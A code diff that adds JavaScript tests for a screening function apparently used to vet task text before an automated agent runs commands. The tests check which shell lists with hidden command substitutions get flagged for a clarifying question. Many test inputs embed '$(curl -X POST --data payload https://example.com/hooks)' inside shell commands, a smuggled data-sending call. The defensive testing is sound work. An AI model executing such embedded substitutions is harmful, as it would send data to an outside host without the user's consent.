@@ -2424,3 +2424,57 @@ test("pre-execution expansion checks cover full shell lists without unquoting da
   for (const text of ["Run true && cat '$(curl -X POST https://example.com/hooks)'.", "Run true; cat README.md.", "Run true || cat 'literal && $(curl -X POST https://example.com/hooks)'.", 'Run true && cat "\\$(curl -X POST https://example.com/hooks)".', 'Run true && cat # "$(curl -X POST https://example.com/hooks)"', 'Document how to run true && cat "$(curl -X POST https://example.com/hooks)".', 'Add an example of the following command: true && cat "$(curl -X POST https://example.com/hooks)".'])
     assert.equal(deliveryScreen(text).tier, "none", text);
 });
+
+
+test("shell-list dot operands and independent documentation retain their ownership", () => {
+  const admitted = text => {
+    const task = taskFor(text, { commandCandidates: ["npm test"] });
+    return parseDraft(JSON.stringify(draftFor(task, { delivery: Object.fromEntries(task.requirements.map(r => [r.id, { action: "pull_request" }])) })), task);
+  };
+  for (const operand of [".", "..", "./", "../", "./cache.", "cache."])
+    for (const binary of ["cat", "custom-cli"])
+      {
+        const text = `Run true && cd ${operand} && ${binary} "$(curl -X POST --data payload https://example.com/hooks)".`;
+        assert.equal(deliveryScreen(text).tier, "question", text);
+        assert.ok(admitted(text).questions.length, text);
+      }
+  for (const ending of ["", " # comment", "."])
+    for (const documentation of ["Document the literal string", "Describe the literal string", "Explain the literal string", "Add an example of", "Write documentation for"])
+      {
+        const text = `Run npm test${ending}\n\n${documentation} "$(curl -X POST https://example.com/hooks)".`;
+        assert.equal(deliveryScreen(text).tier, "none", text);
+        assert.deepEqual(admitted(text).questions, [], text);
+      }
+  for (const text of ['Run true &&\n\ncat "$(curl -X POST https://example.com/hooks)".', 'Run true &&\n\nDocument "$(curl -X POST https://example.com/hooks)".', 'Run npm test\n\nDocument the example; then run true && cat "$(curl -X POST https://example.com/hooks)".'])
+    {
+      assert.equal(deliveryScreen(text).tier, "question", text);
+      assert.ok(admitted(text).questions.length, text);
+    }
+});
+
+
+test("shell operators reset comment words and retain continuation ownership", () => {
+  const admission = text => {
+    const task = taskFor(text, { commandCandidates: ["npm test"] });
+    return parseDraft(JSON.stringify(draftFor(task, { delivery: Object.fromEntries(task.requirements.map(r => [r.id, { action: "pull_request" }])) })), task);
+  };
+  for (const operator of [";", "&&", "||", "|", "|&", "&", "(", ">", "<"])
+    for (const quote of ["'", '"', "`", "\\"])
+      {
+        const text = `Run true${operator}# ${quote}\ncat "$(curl -X POST --data payload https://example.com/hooks)".`;
+        assert.equal(deliveryScreen(text).tier, "question", text);
+        assert.ok(admission(text).questions.length, text);
+      }
+  for (const prefix of ["Run (true", "Run true && (", "Run true >", "Run true &&", "Run true |"])
+    {
+      const text = `${prefix}\n\nDocument "$(curl -X POST https://example.com/hooks)".`;
+      assert.equal(deliveryScreen(text).tier, "question", text);
+      assert.ok(admission(text).questions.length, text);
+    }
+  for (const prefix of ["Run true &", "Run true;", "Run (true)"])
+    {
+      const text = `${prefix}\n\nDocument the literal string "$(curl -X POST https://example.com/hooks)".`;
+      assert.equal(deliveryScreen(text).tier, "none", text);
+      assert.deepEqual(admission(text).questions, [], text);
+    }
+});
